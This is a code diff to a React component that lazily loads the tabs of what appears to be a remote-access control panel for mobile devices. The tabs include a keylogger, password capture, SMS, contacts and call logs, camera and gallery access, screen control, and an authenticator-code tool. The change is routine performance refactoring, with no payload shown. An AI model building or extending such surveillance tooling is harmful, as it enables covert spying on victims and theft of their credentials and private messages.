@@ -1,25 +1,29 @@
-import React, { useState, useCallback } from 'react';
+import React, { Suspense, lazy, useState, useCallback } from 'react';
 import CommandPanel from './CommandPanel.jsx';
 import ResultPanel from './ResultPanel.jsx';
-import ScreenControl from './ScreenControl.jsx';
-import ScreenReaderView from './ScreenReaderView.jsx';
-import KeyloggerTab from './KeyloggerTab.jsx';
-import AppManager from './AppManager.jsx';
-import AppMonitorTab from './AppMonitorTab.jsx';
-import PermissionsTab from './PermissionsTab.jsx';
-import NotificationsTab from './NotificationsTab.jsx';
-import RecentActivityTab from './RecentActivityTab.jsx';
 import LiveMonitor from './LiveMonitor.jsx';
-import TaskStudio from './TaskStudio.jsx';
-import PasswordsTab from './PasswordsTab.jsx';
 import ControlCenter from './ControlCenter.jsx';
-import GestureTab from './GestureTab.jsx';
-import SMSManagerTab from './SMSManagerTab.jsx';
-import FileManagerTab from './FileManagerTab.jsx';
-import ContactsCallLogTab from './ContactsCallLogTab.jsx';
-import CameraMonitorTab from './CameraMonitorTab.jsx';
-import GalleryTab from './GalleryTab.jsx';
-import GcodeAuthenticator from './GcodeAuthenticator.jsx';
+
+// Heavy device tools are loaded only when their tab is first opened. Once loaded,
+// the panel stays mounted (display:none when inactive), so switching tabs keeps
+// its local state, active stream controls, and loaded data alive.
+const ScreenControl = lazy(() => import('./ScreenControl.jsx'));
+const ScreenReaderView = lazy(() => import('./ScreenReaderView.jsx'));
+const KeyloggerTab = lazy(() => import('./KeyloggerTab.jsx'));
+const AppManager = lazy(() => import('./AppManager.jsx'));
+const AppMonitorTab = lazy(() => import('./AppMonitorTab.jsx'));
+const PermissionsTab = lazy(() => import('./PermissionsTab.jsx'));
+const NotificationsTab = lazy(() => import('./NotificationsTab.jsx'));
+const RecentActivityTab = lazy(() => import('./RecentActivityTab.jsx'));
+const TaskStudio = lazy(() => import('./TaskStudio.jsx'));
+const PasswordsTab = lazy(() => import('./PasswordsTab.jsx'));
+const GestureTab = lazy(() => import('./GestureTab.jsx'));
+const SMSManagerTab = lazy(() => import('./SMSManagerTab.jsx'));
+const FileManagerTab = lazy(() => import('./FileManagerTab.jsx'));
+const ContactsCallLogTab = lazy(() => import('./ContactsCallLogTab.jsx'));
+const CameraMonitorTab = lazy(() => import('./CameraMonitorTab.jsx'));
+const GalleryTab = lazy(() => import('./GalleryTab.jsx'));
+const GcodeAuthenticator = lazy(() => import('./GcodeAuthenticator.jsx'));
 
 const TABS = [
   { id: 'control_center', label: '🎮 Control Center' },
@@ -45,16 +49,27 @@ const TABS = [
 ];
 
 const initialRefreshKeys = Object.fromEntries(TABS.map(t => [t.id, 0]));
+const initialLoadedTabs = new Set(['control_center', 'live_monitor', 'commands']);
+
+function TabLoading() {
+  return (
+    <div className="tab-loading" role="status" aria-live="polite">
+      <span className="loading-spinner" aria-hidden="true" />
+      Loading tool…
+    </div>
+  );
+}
 
 export default function DeviceControl({
   device, sendCommand, results, pending, onBack,
   streamFrame, cameraFrame, send, keylogPushEntries, notifPushEntries,
   activityAppEntries, screenReaderPushData, offlineRecordingVersion,
-  serverLatency, deviceLatency, gcodeVersion, galleryStream,
+  serverLatency, deviceLatency, gcodeVersion, galleryStream, connected,
 }) {
   const [activeTab, setActiveTab]     = useState('control_center');
   const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);
   const [galleryActive, setGalleryActive] = useState(false);
+  const [loadedTabs, setLoadedTabs] = useState(initialLoadedTabs);
 
   const info     = device.deviceInfo || {};
   const isOnline = device.isOnline;
@@ -65,6 +80,11 @@ export default function DeviceControl({
 
   const refreshTab = useCallback((tabId) => {
     setRefreshKeys(prev => ({ ...prev, [tabId]: (prev[tabId] || 0) + 1 }));
+  }, []);
+
+  const selectTab = useCallback((tabId) => {
+    setActiveTab(tabId);
+    setLoadedTabs(prev => prev.has(tabId) ? prev : new Set([...prev, tabId]));
   }, []);
 
   const tabVisible = (id) => ({ display: activeTab === id ? 'flex' : 'none', flexDirection: 'column', flex: 1, minHeight: 0 });
@@ -115,7 +135,7 @@ export default function DeviceControl({
           <button
             key={tab.id}
             className={`dc-tab-btn ${activeTab === tab.id ? 'active' : ''}`}
-            onClick={() => setActiveTab(tab.id)}
+            onClick={() => selectTab(tab.id)}
           >
             {tab.label}
           </button>
@@ -143,23 +163,25 @@ export default function DeviceControl({
         </button>
       </div>
 
-      <div style={tabVisible('control_center')}>
-        <ControlCenter
-          key={refreshKeys.control_center}
-          device={device}
-          sendCommand={sendCommand}
-          results={results}
-          streamFrame={streamFrame}
-          send={send}
-          serverLatency={serverLatency}
-          deviceLatency={deviceLatency}
-          onTabChange={setActiveTab}
-          screenReaderPushData={screenReaderPushData}
-          offlineRecordingVersion={offlineRecordingVersion}
-        />
-      </div>
+      <Suspense fallback={<TabLoading />}>
+        <div style={tabVisible('control_center')}>
+          <ControlCenter
+            key={refreshKeys.control_center}
+            device={device}
+            sendCommand={sendCommand}
+            results={results}
+            streamFrame={streamFrame}
+            send={send}
+            serverLatency={serverLatency}
+            deviceLatency={deviceLatency}
+            onTabChange={selectTab}
+            screenReaderPushData={screenReaderPushData}
+            offlineRecordingVersion={offlineRecordingVersion}
+            connected={connected}
+          />
+        </div>
 
-      <div style={tabVisible('live_monitor')}>
+      {loadedTabs.has('live_monitor') && <div style={tabVisible('live_monitor')}>
         <LiveMonitor
           key={refreshKeys.live_monitor}
           notifEntries={notifPushEntries || []}
@@ -169,9 +191,9 @@ export default function DeviceControl({
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('commands')} className="dc-layout">
+      {loadedTabs.has('commands') && <div style={tabVisible('commands')} className="dc-layout">
         <CommandPanel
           key={refreshKeys.commands}
           onSend={handleCommand}
@@ -179,19 +201,20 @@ export default function DeviceControl({
           pendingCommands={pending.map(p => p.command)}
         />
         <ResultPanel results={results} />
-      </div>
+      </div>}
 
-      <div style={tabVisible('screen_control')}>
+      {loadedTabs.has('screen_control') && <div style={tabVisible('screen_control')}>
         <ScreenControl
           key={refreshKeys.screen_control}
           device={device}
           sendCommand={sendCommand}
           streamFrame={streamFrame}
           send={send}
+          connected={connected}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('camera_monitor')}>
+      {loadedTabs.has('camera_monitor') && <div style={tabVisible('camera_monitor')}>
         <CameraMonitorTab
           key={refreshKeys.camera_monitor}
           device={device}
@@ -199,29 +222,31 @@ export default function DeviceControl({
           results={results}
           sseCameraFrame={cameraFrame}
           galleryActive={galleryActive}
+          connected={connected}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('screen_reader')}>
+      {loadedTabs.has('screen_reader') && <div style={tabVisible('screen_reader')}>
         <ScreenReaderView
           key={refreshKeys.screen_reader}
           device={device}
           sendCommand={sendCommand}
           results={results}
           screenPushData={screenReaderPushData}
+          connected={connected}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('task_studio')}>
+      {loadedTabs.has('task_studio') && <div style={tabVisible('task_studio')}>
         <TaskStudio
           key={refreshKeys.task_studio}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('passwords')}>
+      {loadedTabs.has('passwords') && <div style={tabVisible('passwords')}>
         <PasswordsTab
           key={refreshKeys.passwords}
           device={device}
@@ -229,9 +254,9 @@ export default function DeviceControl({
           results={results}
           keylogPushEntries={keylogPushEntries || []}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('notifications')}>
+      {loadedTabs.has('notifications') && <div style={tabVisible('notifications')}>
         <NotificationsTab
           key={refreshKeys.notifications}
           device={device}
@@ -239,35 +264,35 @@ export default function DeviceControl({
           results={results}
           notifPushEntries={notifPushEntries || []}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('sms_manager')}>
+      {loadedTabs.has('sms_manager') && <div style={tabVisible('sms_manager')}>
         <SMSManagerTab
           key={refreshKeys.sms_manager}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('contacts_calls')}>
+      {loadedTabs.has('contacts_calls') && <div style={tabVisible('contacts_calls')}>
         <ContactsCallLogTab
           key={refreshKeys.contacts_calls}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('activity')}>
+      {loadedTabs.has('activity') && <div style={tabVisible('activity')}>
         <RecentActivityTab
           key={refreshKeys.activity}
           device={device}
           activityEntries={activityAppEntries || []}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('keylogger')}>
+      {loadedTabs.has('keylogger') && <div style={tabVisible('keylogger')}>
         <KeyloggerTab
           key={refreshKeys.keylogger}
           device={device}
@@ -275,9 +300,9 @@ export default function DeviceControl({
           results={results}
           keylogPushEntries={keylogPushEntries || []}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('gallery')}>
+      {loadedTabs.has('gallery') && <div style={tabVisible('gallery')}>
         <GalleryTab
           key={refreshKeys.gallery}
           device={device}
@@ -286,27 +311,27 @@ export default function DeviceControl({
           galleryStream={galleryStream}
           onGalleryActive={setGalleryActive}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('file_manager')}>
+      {loadedTabs.has('file_manager') && <div style={tabVisible('file_manager')}>
         <FileManagerTab
           key={refreshKeys.file_manager}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('app_manager')}>
+      {loadedTabs.has('app_manager') && <div style={tabVisible('app_manager')}>
         <AppManager
           key={refreshKeys.app_manager}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('app_monitor')}>
+      {loadedTabs.has('app_monitor') && <div style={tabVisible('app_monitor')}>
         <AppMonitorTab
           key={refreshKeys.app_monitor}
           device={device}
@@ -314,27 +339,27 @@ export default function DeviceControl({
           results={results}
           screenReaderPushData={screenReaderPushData}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('permissions')}>
+      {loadedTabs.has('permissions') && <div style={tabVisible('permissions')}>
         <PermissionsTab
           key={refreshKeys.permissions}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('gestures')}>
+      {loadedTabs.has('gestures') && <div style={tabVisible('gestures')}>
         <GestureTab
           key={refreshKeys.gestures}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      </div>
+      </div>}
 
-      <div style={tabVisible('pro_tools')}>
+      {loadedTabs.has('pro_tools') && <div style={tabVisible('pro_tools')}>
         <GcodeAuthenticator
           key={refreshKeys.pro_tools}
           device={device}
@@ -343,7 +368,8 @@ export default function DeviceControl({
           screenReaderPushData={screenReaderPushData}
           gcodeVersion={gcodeVersion}
         />
-      </div>
+      </div>}
+      </Suspense>
     </div>
   );
 }
